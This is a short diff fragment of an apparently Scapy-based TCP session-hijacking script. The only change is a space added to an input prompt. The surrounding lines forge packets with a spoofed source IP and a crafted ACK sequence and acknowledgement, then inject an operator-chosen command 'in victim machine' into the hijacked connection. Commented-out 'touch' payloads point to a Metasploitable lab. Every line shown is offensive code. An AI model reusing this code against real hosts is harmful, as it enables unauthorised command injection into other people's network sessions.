@@ -34,7 +34,7 @@ def spoof(pkt):
       ip = IP(src=anothervictim,dst=targetip)
       tcp=TCP(sport=oldtcp.sport,dport=oldtcp.dport,flags="A",seq=newseq,ack=newack)
       #data="\ntouch /home/msfadmin/sessionhijacking.txt\n"
-      cmd = input(f"{bcolors.WARNING}Enter the command you want to execute in victim machine..:{bcolors.RESET}{bcolors.lightred}")
+      cmd = input(f"{bcolors.WARNING} Enter the command you want to execute in victim machine..:{bcolors.RESET}{bcolors.lightred}")
       print(f"{bcolors.RESET}")
       data = "\n"+cmd+"\n"
       #data="\ntouch /home/sessionhijacking.txt\n"
